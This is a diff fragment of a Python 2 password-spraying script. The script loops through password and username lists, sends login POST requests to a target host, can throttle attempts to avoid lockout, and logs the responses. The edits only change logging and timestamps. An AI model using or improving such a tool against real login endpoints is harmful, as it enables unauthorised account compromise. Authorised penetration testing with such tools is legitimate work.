@@ -70,11 +70,12 @@ for key,value in dataDict.iteritems():
 for password in passwordsList:
 
     # Get time right before spray
-    date = time.strftime("%m.%d.%Y", time.gmtime())
-    tyme = time.strftime("%H:%M:%S", time.gmtime())
+    date = time.strftime("%m.%d.%Y", time.localtime())
+    tyme = time.strftime("%H:%M:%S", time.localtime())
 
     responseDict = {}
 
+    print "Password " + str(passwordsList.index(password) + 1) + " of " + str(len(passwordsList))
     # Perform spray
     for username in usernamesList:
         # Load injection points
@@ -82,7 +83,7 @@ for password in passwordsList:
         dataDict[passwordKey] = password
         
         # Attempt login
-        print "Attempting " + username + ':' + password
+        print "\tAttempting " + username + ':' + password
         url = "http://" + headerDict["Host"] + endPoint
         #response = requests.post(url=url, headers=headerDict, data=dataDict, proxies=proxies, verify=False)
         response = requests.post(url=url, headers=headerDict, data=dataDict, verify=False)
@@ -96,10 +97,10 @@ for password in passwordsList:
 
         if(not args.shotgun):
             sleepTime = float(sleepTimeSeconds)/float(len(usernamesList))
-            print "Sleeping for: " + str(sleepTime) + " seconds"
             time.sleep(sleepTime)
 
-#    meaningFulResponses = extractMeaningfulResponses(responseDict)
+    # Indicate number of unique responses (still basic approach)
+    print "\t\tUnique responses: " + str(len(responseDict))
 
     # Create file
     if not os.path.exists("logs/" + date):
